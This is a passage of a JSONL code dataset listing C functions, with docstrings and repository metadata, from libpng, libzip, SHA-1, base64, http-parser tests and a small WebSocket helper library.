/* The filler channel has gone already */\n\n   /* Fix the rowbytes value. */\n   row_info->rowbytes = dp-row;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_packswap(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_packswap\");\n\n   if (row_info->bit_depth < 8)\n   {\n      png_bytep rp;\n      png_const_bytep end, table;\n\n      end = row + row_info->rowbytes;\n\n      if (row_info->bit_depth == 1)\n         table = onebppswaptable;\n\n      else if (row_info->bit_depth == 2)\n         table = twobppswaptable;\n\n      else if (row_info->bit_depth == 4)\n         table = fourbppswaptable;\n\n      else\n         return;\n\n      for (rp = row; rp < end; rp++)\n         *rp = table[*rp];\n   }\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* FLOATING_ARITHMETIC */\n", "func_signal": "png_uint_32 PNGAPI\npng_get_sCAL_s(png_const_structrp png_ptr, png_const_inforp info_ptr,\n    int *unit, png_charpp width, png_charpp height)", "code": "{\n   if (png_ptr != NULL && info_ptr != NULL &&\n       (info_ptr->valid & PNG_INFO_sCAL))\n   {\n      *unit = info_ptr->scal_unit;\n      *width = info_ptr->scal_s_width;\n      *height = info_ptr->scal_s_height;\n      return (PNG_INFO_sCAL);\n   }\n\n   return(0);\n}", "path": "ext\\libpng17\\pngget.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_bgr(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_bgr\");\n\n   if ((row_info->color_type & PNG_COLOR_MASK_COLOR))\n   {\n      png_uint_32 row_width = row_info->width;\n      if (row_info->bit_depth == 8)\n      {\n         if (row_info->color_type == PNG_COLOR_TYPE_RGB)\n         {\n            png_bytep rp;\n            png_uint_32 i;\n\n            for (i = 0, rp = row; i < row_width; i++, rp += 3)\n            {\n               png_byte save = *rp;\n               *rp = *(rp + 2);\n               *(rp + 2) = save;\n            }\n         }\n\n         else if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n         {\n            png_bytep rp;\n            png_uint_32 i;\n\n            for (i = 0, rp = row; i < row_width; i++, rp += 4)\n            {\n               png_byte save = *rp;\n               *rp = *(rp + 2);\n               *(rp + 2) = save;\n            }\n         }\n      }\n\n#ifdef PNG_16BIT_SUPPORTED\n      else if (row_info->bit_depth == 16)\n      {\n         if (row_info->color_type == PNG_COLOR_TYPE_RGB)\n         {\n            png_bytep rp;\n            png_uint_32 i;\n\n            for (i = 0, rp = row; i < row_width; i++, rp += 6)\n            {\n               png_byte save = *rp;\n               *rp = *(rp + 4);\n               *(rp + 4) = save;\n               save = *(rp + 1);\n               *(rp + 1) = *(rp + 5);\n               *(rp + 5) = save;\n            }\n         }\n\n         else if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n         {\n            png_bytep rp;\n            png_uint_32 i;\n\n            for (i = 0, rp = row; i < row_width; i++, rp += 8)\n            {\n               png_byte save = *rp;\n               *rp = *(rp + 4);\n               *(rp + 4) = save;\n               save = *(rp + 1);\n               *(rp + 1) = *(rp + 5);\n               *(rp + 5) = save;\n            }\n         }\n      }\n#endif\n   }\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_invert(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_invert\");\n\n  /* This test removed from libpng version 1.0.13 and 1.2.0:\n   *   if (row_info->bit_depth == 1 &&\n   */\n   if (row_info->color_type == PNG_COLOR_TYPE_GRAY)\n   {\n      png_bytep rp = row;\n      png_size_t i;\n      png_size_t istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i++)\n      {\n         *rp = (png_byte)(~(*rp));\n         rp++;\n      }\n   }\n\n   else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA &&\n      row_info->bit_depth == 8)\n   {\n      png_bytep rp = row;\n      png_size_t i;\n      png_size_t istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i += 2)\n      {\n         *rp = (png_byte)(~(*rp));\n         rp += 2;\n      }\n   }\n\n#ifdef PNG_16BIT_SUPPORTED\n   else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA &&\n      row_info->bit_depth == 16)\n   {\n      png_bytep rp = row;\n      png_size_t i;\n      png_size_t istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i += 4)\n      {\n         *rp = (png_byte)(~(*rp));\n         *(rp + 1) = (png_byte)(~(*(rp + 1)));\n         rp += 4;\n      }\n   }\n#endif\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_swap(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_swap\");\n\n   if (row_info->bit_depth == 16)\n   {\n      png_bytep rp = row;\n      png_uint_32 i;\n      png_uint_32 istop= row_info->width * row_info->channels;\n\n      for (i = 0; i < istop; i++, rp += 2)\n      {\n         png_byte t = *rp;\n         *rp = *(rp + 1);\n         *(rp + 1) = t;\n      }\n   }\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Turn on pixel packing */\n", "func_signal": "void PNGAPI\npng_set_packing(png_structrp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_packing\");\n\n   if (png_ptr == NULL)\n      return;\n\n   if (png_ptr->bit_depth < 8)\n   {\n      png_ptr->transformations |= PNG_PACK;\n#     ifdef PNG_WRITE_SUPPORTED\n         png_ptr->usr_bit_depth = 8;\n#     endif\n   }\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Added to libpng-1.2.7 */\n", "func_signal": "void PNGAPI\npng_set_add_alpha(png_structrp png_ptr, png_uint_32 filler, int filler_loc)", "code": "{\n   png_debug(1, \"in png_set_add_alpha\");\n\n   if (png_ptr == NULL)\n      return;\n\n   png_set_filler(png_ptr, filler, filler_loc);\n   /* The above may fail to do anything. */\n   if (png_ptr->transformations & PNG_FILLER)\n      png_ptr->transformations |= PNG_ADD_ALPHA;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* _zip_dirent_write(zde, fp, localp, error):\n   Writes zip directory entry zde to file fp.\n\n   If localp != 0, it writes a local header instead of a central\n   directory entry.\n\n   Returns 0 if successful. On error, error is filled in and -1 is\n   returned.\n*/\n", "func_signal": "int\n_zip_dirent_write(struct zip_dirent *zde, FILE *fp, int localp,\n\t\t  struct zip_error *error)", "code": "{\n    unsigned short dostime, dosdate;\n\n    fwrite(localp ? LOCAL_MAGIC : CENTRAL_MAGIC, 1, 4, fp);\n\n    if (!localp)\n\t_zip_write2(zde->version_madeby, fp);\n    _zip_write2(zde->version_needed, fp);\n    _zip_write2(zde->bitflags, fp);\n    _zip_write2(zde->comp_method, fp);\n\n    _zip_u2d_time(zde->last_mod, &dostime, &dosdate);\n    _zip_write2(dostime, fp);\n    _zip_write2(dosdate, fp);\n    \n    _zip_write4(zde->crc, fp);\n    _zip_write4(zde->comp_size, fp);\n    _zip_write4(zde->uncomp_size, fp);\n    \n    _zip_write2(zde->filename_len, fp);\n    _zip_write2(zde->extrafield_len, fp);\n    \n    if (!localp) {\n\t_zip_write2(zde->comment_len, fp);\n\t_zip_write2(zde->disk_number, fp);\n\t_zip_write2(zde->int_attrib, fp);\n\t_zip_write4(zde->ext_attrib, fp);\n\t_zip_write4(zde->offset, fp);\n    }\n\n    if (zde->filename_len)\n\tfwrite(zde->filename, 1, zde->filename_len, fp);\n\n    if (zde->extrafield_len)\n\tfwrite(zde->extrafield, 1, zde->extrafield_len, fp);\n\n    if (!localp) {\n\tif (zde->comment_len)\n\t    fwrite(zde->comment, 1, zde->comment_len, fp);\n    }\n\n    if (ferror(fp)) {\n\t_zip_error_set(error, ZIP_ER_WRITE, errno);\n\treturn -1;\n    }\n\n    return 0;\n}", "path": "ext\\libzip\\zip_dirent.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* _zip_free:\n   frees the space allocated to a zipfile struct, and closes the\n   corresponding file. */\n", "func_signal": "void\n_zip_free(struct zip *za)", "code": "{\n    int i;\n\n    if (za == NULL)\n\treturn;\n\n    if (za->zn)\n\tfree(za->zn);\n\n    if (za->zp)\n\tfclose(za->zp);\n\n    _zip_cdir_free(za->cdir);\n\n    if (za->entry) {\n\tfor (i=0; i<za->nentry; i++) {\n\t    _zip_entry_free(za->entry+i);\n\t}\n\tfree(za->entry);\n    }\n\n    for (i=0; i<za->nfile; i++) {\n\tif (za->file[i]->error.zip_err == ZIP_ER_OK) {\n\t    _zip_error_set(&za->file[i]->error, ZIP_ER_ZIPCLOSED, 0);\n\t    za->file[i]->za = NULL;\n\t}\n    }\n\n    free(za->file);\n    \n    free(za);\n\n    return;\n}", "path": "ext\\libzip\\zip_free.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* pHYs */\n", "func_signal": "png_uint_32 PNGAPI\npng_get_PLTE(png_const_structrp png_ptr, png_inforp info_ptr,\n    png_colorp *palette, int *num_palette)", "code": "{\n   png_debug1(1, \"in %s retrieval function\", \"PLTE\");\n\n   if (png_ptr != NULL && info_ptr != NULL && (info_ptr->valid & PNG_INFO_PLTE)\n       && palette != NULL)\n   {\n      *palette = info_ptr->palette;\n      *num_palette = info_ptr->num_palette;\n      png_debug1(3, \"num_palette = %d\", *num_palette);\n      return (PNG_INFO_PLTE);\n   }\n\n   return (0);\n}", "path": "ext\\libpng17\\pngget.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* _zip_dirent_read(zde, fp, bufp, left, localp, error):\n   Fills the zip directory entry zde.\n\n   If bufp is non-NULL, data is taken from there and bufp is advanced\n   by the amount of data used; otherwise data is read from fp as needed.\n   \n   if leftp is non-NULL, no more bytes than specified by it are used,\n   and *leftp is reduced by the number of bytes used.\n\n   If local != 0, it reads a local header instead of a central\n   directory entry.\n\n   Returns 0 if successful. On error, error is filled in and -1 is\n   returned.\n\n   XXX: leftp and file position undefined on error.\n*/\n", "func_signal": "int\n_zip_dirent_read(struct zip_dirent *zde, FILE *fp,\n\t\t unsigned char **bufp, unsigned int *leftp, int local,\n\t\t struct zip_error *error)", "code": "{\n    unsigned char buf[CDENTRYSIZE];\n    unsigned char *cur;\n    unsigned short dostime, dosdate;\n    unsigned int size;\n\n    if (local)\n\tsize = LENTRYSIZE;\n    else\n\tsize = CDENTRYSIZE;\n\n    if (leftp && (*leftp < size)) {\n\t_zip_error_set(error, ZIP_ER_NOZIP, 0);\n\treturn -1;\n    }\n\n    if (bufp) {\n\t/* use data from buffer */\n\tcur = *bufp;\n    }\n    else {\n\t/* read entry from disk */\n\tif ((fread(buf, 1, size, fp)<size)) {\n\t    _zip_error_set(error, ZIP_ER_READ, errno);\n\t    return -1;\n\t}\n\tcur = buf;\n    }\n\n    if (memcmp(cur, (local ? LOCAL_MAGIC : CENTRAL_MAGIC), 4) != 0) {\n\t_zip_error_set(error, ZIP_ER_NOZIP, 0);\n\treturn -1;\n    }\n    cur += 4;\n\n    \n    /* convert buffercontents to zip_dirent */\n    \n    if (!local)\n\tzde->version_madeby = _zip_read2(&cur);\n    else\n\tzde->version_madeby = 0;\n    zde->version_needed = _zip_read2(&cur);\n    zde->bitflags = _zip_read2(&cur);\n    zde->comp_method = _zip_read2(&cur);\n    \n    /* convert to time_t */\n    dostime = _zip_read2(&cur);\n    dosdate = _zip_read2(&cur);\n    zde->last_mod = _zip_d2u_time(dostime, dosdate);\n    \n    zde->crc = _zip_read4(&cur);\n    zde->comp_size = _zip_read4(&cur);\n    zde->uncomp_size = _zip_read4(&cur);\n    \n    zde->filename_len = _zip_read2(&cur);\n    zde->extrafield_len = _zip_read2(&cur);\n    \n    if (local) {\n\tzde->comment_len = 0;\n\tzde->disk_number = 0;\n\tzde->int_attrib = 0;\n\tzde->ext_attrib = 0;\n\tzde->offset = 0;\n    } else {\n\tzde->comment_len = _zip_read2(&cur);\n\tzde->disk_number = _zip_read2(&cur);\n\tzde->int_attrib = _zip_read2(&cur);\n\tzde->ext_attrib = _zip_read4(&cur);\n\tzde->offset = _zip_read4(&cur);\n    }\n\n    zde->filename = NULL;\n    zde->extrafield = NULL;\n    zde->comment = NULL;\n\n    size += zde->filename_len+zde->extrafield_len+zde->comment_len;\n\n    if (leftp && (*leftp < size)) {\n\t_zip_error_set(error, ZIP_ER_NOZIP, 0);\n\treturn -1;\n    }\n\n    if (bufp) {\n\tif (zde->filename_len) {\n\t    zde->filename = _zip_readstr(&cur, zde->filename_len, 1, error);\n\t    if (!zde->filename)\n\t\t    return -1;\n\t}\n\n\tif (zde->extrafield_len) {\n\t    zde->extrafield = _zip_readstr(&cur, zde->extrafield_len, 0,\n\t\t\t\t\t   error);\n\t    if (!zde->extrafield)\n\t\treturn -1;\n\t}\n\n\tif (zde->comment_len) {\n\t    zde->comment = _zip_readstr(&cur, zde->comment_len, 0, error);\n\t    if (!zde->comment)\n\t\treturn -1;\n\t}\n    }\n    else {\n\tif (zde->filename_len) {\n\t    zde->filename = _zip_readfpstr(fp, zde->filename_len, 1, error);\n\t    if (!zde->filename)\n\t\t    return -1;\n\t}\n\n\tif (zde->extrafield_len) {\n\t    zde->extrafield = _zip_readfpstr(fp, zde->extrafield_len, 0,\n\t\t\t\t\t     error);\n\t    if (!zde->extrafield)\n\t\treturn -1;\n\t}\n\n\tif (zde->comment_len) {\n\t    zde->comment = _zip_readfpstr(fp, zde->comment_len, 0, error);\n\t    if (!zde->comment)\n\t\treturn -1;\n\t}\n    }\n\n    if (bufp)\n      *bufp = cur;\n    if (leftp)\n\t*leftp -= size;\n\n    return 0;\n}", "path": "ext\\libzip\\zip_dirent.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/* Turn on BGR-to-RGB mapping */\n", "func_signal": "void PNGAPI\npng_set_bgr(png_structrp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_bgr\");\n\n   if (png_ptr == NULL)\n      return;\n\n   png_ptr->transformations |= PNG_BGR;\n}", "path": "ext\\libpng17\\pngtrans.c", "repo_name": "hrydgard/native", "stars": 73, "license": "other", "language": "c", "size": 9769}
{"docstring": "/*\n *  SHA1PadMessage\n *\n *  Description:\n *      According to the standard, the message must be padded to an even\n *      512 bits.  The first padding bit must be a '1'.  The last 64\n *      bits represent the length of the original message.  All bits in\n *      between should be 0.  This function will pad the message\n *      according to those rules by filling the Message_Block array\n *      accordingly.  It will also call SHA1ProcessMessageBlock()\n *      appropriately.  When it returns, it can be assumed that the\n *      message digest has been computed.\n *\n *  Parameters:\n *      context: [in/out]\n *          The context to pad\n *\n *  Returns:\n *      Nothing.\n *\n *  Comments:\n *\n */\n", "func_signal": "void SHA1PadMessage(SHA1Context *context)", "code": "{\n    /*\n     *  Check to see if the current message block is too small to hold\n     *  the initial padding bits and length.  If so, we will pad the\n     *  block, process it, and then continue padding into a second\n     *  block.\n     */\n    if (context->Message_Block_Index > 55)\n    {\n        context->Message_Block[context->Message_Block_Index++] = 0x80;\n        while(context->Message_Block_Index < 64)\n        {\n            context->Message_Block[context->Message_Block_Index++] = 0;\n        }\n\n        SHA1ProcessMessageBlock(context);\n\n        while(context->Message_Block_Index < 56)\n        {\n            context->Message_Block[context->Message_Block_Index++] = 0;\n        }\n    }\n    else\n    {\n        context->Message_Block[context->Message_Block_Index++] = 0x80;\n        while(context->Message_Block_Index < 56)\n        {\n            context->Message_Block[context->Message_Block_Index++] = 0;\n        }\n    }\n\n    /*\n     *  Store the message length as the last 8 octets\n     */\n    context->Message_Block[56] = (context->Length_High >> 24) & 0xFF;\n    context->Message_Block[57] = (context->Length_High >> 16) & 0xFF;\n    context->Message_Block[58] = (context->Length_High >> 8) & 0xFF;\n    context->Message_Block[59] = (context->Length_High) & 0xFF;\n    context->Message_Block[60] = (context->Length_Low >> 24) & 0xFF;\n    context->Message_Block[61] = (context->Length_Low >> 16) & 0xFF;\n    context->Message_Block[62] = (context->Length_Low >> 8) & 0xFF;\n    context->Message_Block[63] = (context->Length_Low) & 0xFF;\n\n    SHA1ProcessMessageBlock(context);\n}", "path": "include\\c-websocket\\sha1.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "// user required to free the result\n// string terminated by \\0\n", "func_signal": "char *\ncreate_large_chunked_message (int body_size_in_kb, const char* headers)", "code": "{\n  int i;\n  size_t wrote = 0;\n  size_t headers_len = strlen(headers);\n  size_t bufsize = headers_len + (5+1024+2)*body_size_in_kb + 6;\n  char * buf = malloc(bufsize);\n\n  memcpy(buf, headers, headers_len);\n  wrote += headers_len;\n\n  for (i = 0; i < body_size_in_kb; i++) {\n    // write 1kb chunk into the body.\n    memcpy(buf + wrote, \"400\\r\\n\", 5);\n    wrote += 5;\n    memset(buf + wrote, 'C', 1024);\n    wrote += 1024;\n    strcpy(buf + wrote, \"\\r\\n\");\n    wrote += 2;\n  }\n\n  memcpy(buf + wrote, \"0\\r\\n\\r\\n\", 6);\n  wrote += 6;\n  assert(wrote == bufsize);\n\n  return buf;\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* SCAN through every possible breaking to make sure the\n * parser can handle getting the content in any chunks that\n * might come from the socket\n */\n", "func_signal": "void\ntest_scan (const struct message *r1, const struct message *r2, const struct message *r3)", "code": "{\n  char total[80*1024] = \"\\0\";\n  char buf1[80*1024] = \"\\0\";\n  char buf2[80*1024] = \"\\0\";\n  char buf3[80*1024] = \"\\0\";\n\n  strcat(total, r1->raw);\n  strcat(total, r2->raw);\n  strcat(total, r3->raw);\n\n  size_t read;\n\n  int total_len = strlen(total);\n\n  int total_ops = 2 * (total_len - 1) * (total_len - 2) / 2;\n  int ops = 0 ;\n\n  size_t buf1_len, buf2_len, buf3_len;\n  int message_count = count_parsed_messages(3, r1, r2, r3);\n\n  int i,j,type_both;\n  for (type_both = 0; type_both < 2; type_both ++ ) {\n    for (j = 2; j < total_len; j ++ ) {\n      for (i = 1; i < j; i ++ ) {\n\n        if (ops % 1000 == 0)  {\n          printf(\"\\b\\b\\b\\b%3.0f%%\", 100 * (float)ops /(float)total_ops);\n          fflush(stdout);\n        }\n        ops += 1;\n\n        parser_init(type_both ? HTTP_BOTH : r1->type);\n\n        buf1_len = i;\n        strncpy(buf1, total, buf1_len);\n        buf1[buf1_len] = 0;\n\n        buf2_len = j - i;\n        strncpy(buf2, total+i, buf2_len);\n        buf2[buf2_len] = 0;\n\n        buf3_len = total_len - j;\n        strncpy(buf3, total+j, buf3_len);\n        buf3[buf3_len] = 0;\n\n        read = parse(buf1, buf1_len);\n\n        if (parser->upgrade) goto test;\n\n        if (read != buf1_len) {\n          print_error(buf1, read);\n          goto error;\n        }\n\n        read += parse(buf2, buf2_len);\n\n        if (parser->upgrade) goto test;\n\n        if (read != buf1_len + buf2_len) {\n          print_error(buf2, read);\n          goto error;\n        }\n\n        read += parse(buf3, buf3_len);\n\n        if (parser->upgrade) goto test;\n\n        if (read != buf1_len + buf2_len + buf3_len) {\n          print_error(buf3, read);\n          goto error;\n        }\n\n        parse(NULL, 0);\n\ntest:\n        if (parser->upgrade) {\n          upgrade_message_fix(total, read, 3, r1, r2, r3);\n        }\n\n        if (message_count != num_messages) {\n          fprintf(stderr, \"\\n\\nParser didn't see %d messages only %d\\n\",\n            message_count, num_messages);\n          goto error;\n        }\n\n        if (!message_eq(0, r1)) {\n          fprintf(stderr, \"\\n\\nError matching messages[0] in test_scan.\\n\");\n          goto error;\n        }\n\n        if (message_count > 1 && !message_eq(1, r2)) {\n          fprintf(stderr, \"\\n\\nError matching messages[1] in test_scan.\\n\");\n          goto error;\n        }\n\n        if (message_count > 2 && !message_eq(2, r3)) {\n          fprintf(stderr, \"\\n\\nError matching messages[2] in test_scan.\\n\");\n          goto error;\n        }\n\n        parser_free();\n      }\n    }\n  }\n  puts(\"\\b\\b\\b\\b100%\");\n  return;\n\n error:\n  fprintf(stderr, \"i=%d  j=%d\\n\", i, j);\n  fprintf(stderr, \"buf1 (%u) %s\\n\\n\", (unsigned int)buf1_len, buf1);\n  fprintf(stderr, \"buf2 (%u) %s\\n\\n\", (unsigned int)buf2_len , buf2);\n  fprintf(stderr, \"buf3 (%u) %s\\n\", (unsigned int)buf3_len, buf3);\n  exit(1);\n}", "path": "include\\http-parser\\test.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\nint WEBSOCKET_set_content( const char *data, int data_length, unsigned char *dst )\n@data - entire data received with socket\n@data_length - size of @data\n@dst - pointer to char array where the result will be stored\n@dst_len - size of @dst\n@return - WebSocket frame size */\n", "func_signal": "int WEBSOCKET_set_content( const char *data, int data_length, unsigned char *dst, const unsigned int dst_len )", "code": "{\n\tunsigned char *message = ( unsigned char * )malloc( 65535 * sizeof( char ) );\n\tint i;\n\tint data_start_index;\n\n\tmessage[0] = 129;\n\n\tif( data_length <= 125 ) {\n\t\tmessage[1] = ( unsigned char )data_length;\n\t\tdata_start_index = 2;\n\t} else if( data_length > 125 && data_length <= 65535 ) {\n\t\tmessage[1] = 126;\n\t\tmessage[2] = ( unsigned char )( ( data_length >> 8 ) & 255 );\n\t\tmessage[3] = ( unsigned char )( ( data_length ) & 255 );\n\t\tdata_start_index = 4;\n\t} else {\n\t\tmessage[1] = 127;\n\t\tmessage[2] = ( unsigned char )( ( data_length >> 56 ) & 255 );\n\t\tmessage[3] = ( unsigned char )( ( data_length >> 48 ) & 255 );\n\t\tmessage[4] = ( unsigned char )( ( data_length >> 40 ) & 255 );\n\t\tmessage[5] = ( unsigned char )( ( data_length >> 32 ) & 255 );\n\t\tmessage[6] = ( unsigned char )( ( data_length >> 24 ) & 255 );\n\t\tmessage[7] = ( unsigned char )( ( data_length >> 16 ) & 255 );\n\t\tmessage[8] = ( unsigned char )( ( data_length >> 8 ) & 255 );\n\t\tmessage[9] = ( unsigned char )( ( data_length ) & 255 );\n\t\tdata_start_index = 10;\n\t}\n\n\tfor( i = 0; i < data_length; i++ ) {\n\t\tmessage[ data_start_index + i ] = ( unsigned char )data[i];\n\t}\n\n\tfor( i = 0; i < data_length+ data_start_index; i++ ) {\n\t\tdst[i] = ( unsigned char )message[ i ];\n\t}\n\n\tif( message ) {\n\t\tfree( message );\n\t\tmessage = NULL;\n\t}\n\n\treturn i;\n}", "path": "include\\c-websocket\\cWebSockets.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\n *  SHA1Input\n *\n *  Description:\n *      This function accepts an array of octets as the next portion of\n *      the message.\n *\n *  Parameters:\n *      context: [in/out]\n *          The SHA-1 context to update\n *      message_array: [in]\n *          An array of characters representing the next portion of the\n *          message.\n *      length: [in]\n *          The length of the message in message_array\n *\n *  Returns:\n *      Nothing.\n *\n *  Comments:\n *\n */\n", "func_signal": "void SHA1Input(     SHA1Context         *context,\n                    const unsigned char *message_array,\n                    unsigned            length)", "code": "{\n    if (!length)\n    {\n        return;\n    }\n\n    if (context->Computed || context->Corrupted)\n    {\n        context->Corrupted = 1;\n        return;\n    }\n\n    while(length-- && !context->Corrupted)\n    {\n        context->Message_Block[context->Message_Block_Index++] =\n                                                (*message_array & 0xFF);\n\n        context->Length_Low += 8;\n        /* Force it to 32 bits */\n        context->Length_Low &= 0xFFFFFFFF;\n        if (context->Length_Low == 0)\n        {\n            context->Length_High++;\n            /* Force it to 32 bits */\n            context->Length_High &= 0xFFFFFFFF;\n            if (context->Length_High == 0)\n            {\n                /* Message is too long */\n                context->Corrupted = 1;\n            }\n        }\n\n        if (context->Message_Block_Index == 64)\n        {\n            SHA1ProcessMessageBlock(context);\n        }\n\n        message_array++;\n    }\n}", "path": "include\\c-websocket\\sha1.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/**\n* decode a 4 char base64 encoded byte triple\n*\n* @param quadruple the 4 characters that should be decoded\n* @param result the decoded data\n* @return lenth of the result ( 1, 2 or 3 ), 0 on failure\n*/\n", "func_signal": "int _base64_decode_triple( char quadruple[ 4 ], unsigned char *result )", "code": "{\n\tint i, triple_value, bytes_to_decode = 3, only_equals_yet = 1;\n\tint char_value[ 4 ];\n\n\tfor ( i=0; i<4; i++ )\n\t\tchar_value[ i ] = _base64_char_value( quadruple[ i ] );\n\n\t/* check if the characters are valid */\n\tfor ( i=3; i>=0; i-- )\n\t{\n\t\tif ( char_value[ i ] < 0 )\n\t\t{\n\t\t\tif ( only_equals_yet && quadruple[ i ] =='=' )\n\t\t\t{\n\t\t\t\t/* we will ignore this character anyway, make it something\n\t\t\t\t* that does not break our calculations */\n\t\t\t\tchar_value[ i ]=0;\n\t\t\t\tbytes_to_decode--;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\treturn 0;\n\t\t}\n\t\t/* after we got a real character, no other '=' are allowed anymore */\n\t\tonly_equals_yet = 0;\n\t}\n\n\t/* if we got \"====\" as input, bytes_to_decode is -1 */\n\tif ( bytes_to_decode < 0 )\n\t\tbytes_to_decode = 0;\n\n\t/* make one big value out of the partial values */\n\ttriple_value = char_value[ 0 ];\n\ttriple_value *= 64;\n\ttriple_value += char_value[ 1 ] ;\n\ttriple_value *= 64;\n\ttriple_value += char_value[ 2 ];\n\ttriple_value *= 64;\n\ttriple_value += char_value[ 3 ];\n\n\t/* break the big value into bytes */\n\tfor ( i=bytes_to_decode; i<3; i++ )\n\t\ttriple_value /= 256;\n\tfor ( i=bytes_to_decode-1; i>=0; i-- )\n\t{\n\t\tresult[ i ] = triple_value%256;\n\t\ttriple_value /= 256;\n\t}\n\n\treturn bytes_to_decode;\n}", "path": "include\\c-websocket\\base64.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\nvoid REQUEST_get_header_value( const char *data, const char *requested_key )\n@data - entire data received with socket\n@requested_key - requested key\n@dst - pointer to char array where the result will be stored,\n@dst_len - size of @dst */\n", "func_signal": "void REQUEST_get_header_value( const char *data, const char *requested_key, char *dst, unsigned int dst_len )", "code": "{\n\tchar *src = ( char * )malloc( 65535 * sizeof( char ) );\n\tchar *result_handler;\n\tchar *result;\n\tchar *tmp_header_key;\n\tint i = 0;\n\n\tstrncpy( src, data, 65535 );\n\n\ttmp_header_key = strstr( ( char* )src, requested_key );\n\tif( tmp_header_key == NULL ) {\n\t\tdst = NULL;\n\t\treturn;\n\t}\n\n\tresult_handler = ( char * )malloc( 1024 * sizeof( char ) );\n\tresult = ( char* )calloc( 256, sizeof( char ) );\n\n\tstrncpy( result_handler, tmp_header_key, 1024 );\n\ttmp_header_key = NULL;\n\n\twhile( ( result[ i ] = result_handler[ i ] ) != '\\015' ) {\n\t\tif( result_handler[ i ] != '\\015' ) {\n\t\t\t i++;\n\t\t}\n\t}\n\tresult[ i ]= '\\0';\n\n\tfree( result_handler );\n\tresult_handler = NULL;\n\n\tstrncpy( dst, strstr( result, \": \" ) + 2, dst_len );\n\tfree( src );\n\tsrc = NULL;\n\tfree( result );\n\tresult = NULL;\n\n}", "path": "include\\c-websocket\\cWebSockets.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/*\nint WEBSOCKET_client_version( const char *data )\n@data - entire data received with socket\n@return - value from client's Sec-WebSocket-Version key */\n", "func_signal": "int WEBSOCKET_client_version( const char *data )", "code": "{\n\tchar *version_header = ( char * )malloc( 32 * sizeof( char ) );\n\tint result;\n\n\tREQUEST_get_header_value( data, \"Sec-WebSocket-Version:\", version_header, 32 );\n\n\tif( version_header == NULL ) {\n\t\treturn -1;\n\t}\n\n\tresult = atoi( version_header );\n\n\tif( version_header ) {\n\t\tfree( version_header );\n\t\tversion_header = NULL;\n\t}\n\n\treturn result;\n}", "path": "include\\c-websocket\\cWebSockets.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
{"docstring": "/* Does the parser need to see an EOF to find the end of the message? */\n", "func_signal": "int\nhttp_message_needs_eof (http_parser *parser)", "code": "{\n  if (parser->type == HTTP_REQUEST) {\n    return 0;\n  }\n\n  /* See RFC 2616 section 4.4 */\n  if (parser->status_code / 100 == 1 || /* 1xx e.g. Continue */\n      parser->status_code == 204 ||     /* No Content */\n      parser->status_code == 304 ||     /* Not Modified */\n      parser->flags & F_SKIPBODY) {     /* response to a HEAD request */\n    return 0;\n  }\n\n  if ((parser->flags & F_CHUNKED) || parser->content_length != ULLONG_MAX) {\n    return 0;\n  }\n\n  return 1;\n}", "path": "include\\http-parser\\http_parser.c", "repo_name": "yongboy/c_socket.io_server", "stars": 110, "license": "None", "language": "c", "size": 1438}
